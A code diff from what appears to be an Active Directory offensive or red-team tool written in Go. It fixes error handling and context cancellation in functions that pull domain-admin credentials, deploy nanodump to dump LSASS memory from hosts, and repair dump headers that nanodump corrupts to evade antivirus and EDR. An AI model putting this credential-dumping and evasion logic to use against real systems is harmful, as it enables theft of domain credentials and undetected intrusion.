@@ -39,7 +39,11 @@ func RunImpact(state *core.ADState, evasionProfile string) *core.ToolResult {
 
 	ts := time.Now().Unix()
 	runsDir := filepath.Join(lootDir, fmt.Sprintf("run_%d", ts))
-	os.MkdirAll(runsDir, 0700)
+	if err := os.MkdirAll(runsDir, 0700); err != nil {
+		slog.Error("impact: create runs dir", "error", err)
+		result.Success = false
+		return result
+	}
 
 	daCreds := extractDACreds(state)
 	adminCreds := extractAdminCreds(state)
@@ -509,7 +513,6 @@ func exfilLSASS(state *core.ADState, runsDir string, creds []credWithHost, resul
 		)
 
 		ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
-		defer cancel()
 
 		// ── Deploy nanodump ────────────────────────
 		for _, cred := range hostCreds {
@@ -759,6 +762,7 @@ func exfilLSASS(state *core.ADState, runsDir string, creds []credWithHost, resul
 				utils.HostStyle.Render(host),
 				utils.MutedStyle.Render(lastError))
 		}
+		cancel()
 	}
 	return count
 }
@@ -969,9 +973,11 @@ func validateMinidump(data []byte) error {
 		return fmt.Errorf("dump is too small (%d bytes)", len(data))
 	}
 	if string(data[:4]) != "MDMP" {
+		// nanodump intentionally corrupts the header to evade AV/EDR
+		// (see nanodump output: "The minidump has an invalid signature, restore it running: scripts/restore_signature")
 		copy(data[:4], "MDMP")
 	}
-	if len(data) < 1024*1024 {
+	if len(data) < 1024*1024 && string(data[:4]) == "MDMP" {
 		return fmt.Errorf("dump is suspiciously small (%d bytes)", len(data))
 	}
 	return nil
